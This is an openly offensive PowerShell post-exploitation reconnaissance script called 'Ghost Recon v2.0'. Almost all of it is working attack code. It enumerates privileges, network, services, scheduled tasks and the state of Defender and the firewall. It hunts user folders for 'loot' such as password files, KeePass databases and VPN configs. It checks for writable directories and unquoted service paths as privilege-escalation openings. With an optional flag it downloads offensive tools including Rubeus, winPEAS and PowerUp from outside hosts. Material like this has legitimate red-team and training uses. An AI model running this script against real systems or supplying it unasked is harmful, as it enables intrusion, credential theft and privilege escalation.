# Jusot99's PowerShell Post-Exploitation Recon Script
# Ghost Hacker Edition v2.0 🧠👻

# Colors and Animation
$Host.UI.RawUI.ForegroundColor = "White"

function Show-Banner {
    Write-Host @"

    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
    ██║  ███╗███████║██║   ██║███████╗   ██║   
    ██║   ██║██╔══██║██║   ██║╚════██║   ██║   
    ╚██████╔╝██║  ██║╚██████╔║███████║   ██║   
     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
        Ghost Recon v2.0 by jusot99
"@ -ForegroundColor Cyan
    Start-Sleep -Milliseconds 500
}

function Show-Spinner {
    param([string]$Text, [scriptblock]$ScriptBlock)
    
    $spinner = @('⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷')
    $job = Start-Job -ScriptBlock $ScriptBlock
    
    while ($job.State -eq 'Running') {
        foreach ($frame in $spinner) {
            if ($job.State -ne 'Running') { break }
            Write-Host "`r$frame $Text..." -NoNewline -ForegroundColor Yellow
            Start-Sleep -Milliseconds 100
        }
    }
    
    Receive-Job $job
    Remove-Job $job
    Write-Host "`r✅ $Text completed" -ForegroundColor Green
}

function Section($title) {
    Write-Host "`n" + "="*50 -ForegroundColor DarkCyan
    Write-Host "[ $title ]" -ForegroundColor Cyan -BackgroundColor DarkBlue
    Write-Host "="*50 -ForegroundColor DarkCyan
}

function Sub($label) {
    Write-Host "  [*] $label" -ForegroundColor Green
}

function Highlight($text) {
    Write-Host "    $text" -ForegroundColor Yellow
}

function Get-QuickSystemInfo {
    Show-Spinner "Gathering system information" {
        $os = Get-CimInstance Win32_OperatingSystem
        $computer = Get-CimInstance Win32_ComputerSystem
        return @{
            OS = $os.Caption
            Version = $os.Version
            Architecture = if ([Environment]::Is64BitOperatingSystem) { "64-bit" } else { "32-bit" }
            Manufacturer = $computer.Manufacturer
            Model = $computer.Model
        }
    }
}

function Get-UserPrivileges {
    Show-Spinner "Checking user privileges" {
        whoami /priv | Select-String -Pattern "Se"
    }
}

function Get-NetworkInfo {
    Show-Spinner "Scanning network configuration" {
        return @{
            IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress
            DNS = (Get-DnsClientServerAddress -AddressFamily IPv4).ServerAddresses
            Routes = (Get-NetRoute -AddressFamily IPv4 | Where-Object {$_.NextHop -ne "0.0.0.0"})
        }
    }
}

function Get-RunningServices {
    Show-Spinner "Analyzing running services" {
        Get-Service | Where-Object {$_.Status -eq "Running"} | 
        Select-Object Name, DisplayName -First 15
    }
}

function Get-InterestingFiles {
    Show-Spinner "Searching for interesting files" {
        $patterns = @("*.txt", "*.doc*", "*.pdf", "*.xls*", "*password*", "*config*", "*.kdbx", "*.ovpn")
        $paths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
        
        foreach ($path in $paths) {
            if (Test-Path $path) {
                foreach ($pattern in $patterns) {
                    Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue |
                    Select-Object FullName, Length, LastWriteTime -First 5
                }
            }
        }
    }
}

function Download-RedOpsTools {
    Section "DOWNLOADING RED TEAM TOOLS"
    
    $dest = "$env:USERPROFILE\Downloads\GhostTools"
    New-Item -ItemType Directory -Path $dest -Force | Out-Null
    
    $tools = @(
        @{Name = "winPEAS"; Url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"},
        @{Name = "Seatbelt"; Url = "https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe"},
        @{Name = "SharpUp"; Url = "https://github.com/GhostPack/SharpUp/releases/latest/download/SharpUp.exe"},
        @{Name = "PowerUp"; Url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"},
        @{Name = "Rubeus"; Url = "https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe"}
    )
    
    foreach ($tool in $tools) {
        Show-Spinner "Downloading $($tool.Name)" {
            try {
                Invoke-WebRequest -Uri $tool.Url -OutFile "$dest\$($tool.Name).exe" -ErrorAction Stop
                return "✅ Downloaded successfully"
            } catch {
                return "❌ Failed to download: $($_.Exception.Message)"
            }
        }
    }
    
    Write-Host "`n  All tools saved to: $dest" -ForegroundColor Green
}

# MAIN EXECUTION
Clear-Host
Show-Banner

Section "USER & PRIVILEGE INFO"
Sub "Current User Identity"
Highlight "User: $(whoami)"
Highlight "Domain\User: $env:USERDOMAIN\$env:USERNAME"
Highlight "SID: $([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)"

Sub "Group Membership"
net localgroup administrators | Where-Object {$_ -match $env:USERNAME}
whoami /groups | Select-String -Pattern $env:USERNAME

Sub "Privileges"
Get-UserPrivileges

Section "SYSTEM INFORMATION"
$sysInfo = Get-QuickSystemInfo
Sub "Operating System"
Highlight "OS: $($sysInfo.OS)"
Highlight "Version: $($sysInfo.Version)"
Highlight "Architecture: $($sysInfo.Architecture)"

Sub "Hardware"
Highlight "Manufacturer: $($sysInfo.Manufacturer)"
Highlight "Model: $($sysInfo.Model)"
Highlight "Processors: $((Get-CimInstance Win32_Processor).Name)"

Sub "System Uptime"
Highlight "Last Boot: $((Get-CimInstance Win32_OperatingSystem).LastBootUpTime)"
Highlight "Uptime: $((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime)"

Section "NETWORK RECONNAISSANCE"
$netInfo = Get-NetworkInfo
Sub "Network Configuration"
Highlight "IP Addresses: $($netInfo.IP -join ', ')"
Highlight "DNS Servers: $($netInfo.DNS -join ', ')"

Sub "Active Connections"
netstat -ano | Select-String -Pattern "ESTABLISHED" | Select-Object -First 10

Sub "Network Shares"
net share

Section "PROCESSES & SERVICES"
Sub "Running Processes"
tasklist /v | Select-Object -First 15

Sub "Critical Services"
Get-RunningServices

Sub "Startup Programs"
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, User | Format-Table -AutoSize

Section "SCHEDULED TASKS"
schtasks /query /fo LIST /v | Select-String -Pattern "TaskName|Run As User|Next Run Time" | Select-Object -First 20

Section "SECURITY ASSESSMENT"
Sub "Windows Defender Status"
$defender = Get-MpComputerStatus
Highlight "Real-time Protection: $($defender.RealTimeProtectionEnabled)"
Highlight "Antivirus Enabled: $($defender.AntivirusEnabled)"
Highlight "Last Scan: $($defender.LastQuickScan)"

Sub "Firewall Status"
netsh advfirewall show allprofiles | Select-String -Pattern "State"

Section "LOOT & INTERESTING FILES"
Sub "Recent Documents"
Get-ChildItem "$env:USERPROFILE\Recent" -ErrorAction SilentlyContinue | 
Select-Object Name, LastWriteTime -First 10

Sub "Potential Credential Files"
Get-InterestingFiles

Sub "Browser Data Locations"
$browsers = @("Chrome", "Firefox", "Edge", "Brave")
foreach ($browser in $browsers) {
    $path = "$env:USERPROFILE\AppData\Local\$browser"
    if (Test-Path $path) {
        Highlight "$browser found: $path"
    }
}

# Download tools if requested
if ($args[0] -eq "--download-tools") {
    Download-RedOpsTools
}

Section "QUICK PRIVESC CHECKS"
Sub "Writable Directories"
Get-ChildItem C:\ -Directory -ErrorAction SilentlyContinue | 
Where-Object {$_.Attributes -match "Directory"} |
Get-Acl | Where-Object {$_.Access | Where-Object {$_.IdentityReference -eq $env:USERNAME -and $_.FileSystemRights -match "Write"}} |
Select-Object Path -First 5

Sub "Unquoted Service Paths"
Get-WmiObject -Class Win32_Service | 
Where-Object {$_.PathName -notlike "`"*`"" -and $_.PathName -like "*.exe*"} |
Select-Object Name, PathName -First 5

Write-Host "`n" + "="*60 -ForegroundColor Magenta
Write-Host "[+] GHOST RECON COMPLETE" -ForegroundColor Green -BackgroundColor DarkBlue
Write-Host "    Next steps:" -ForegroundColor Yellow
Write-Host "    • Review privileges and group membership" -ForegroundColor White
Write-Host "    • Check writable paths and service permissions" -ForegroundColor White
Write-Host "    • Analyze running processes for credentials" -ForegroundColor White
Write-Host "    • Use downloaded tools for deeper analysis" -ForegroundColor White
Write-Host "="*60 -ForegroundColor Magenta
Write-Host "    Ghost out! 👻 - jusot99" -ForegroundColor Cyan
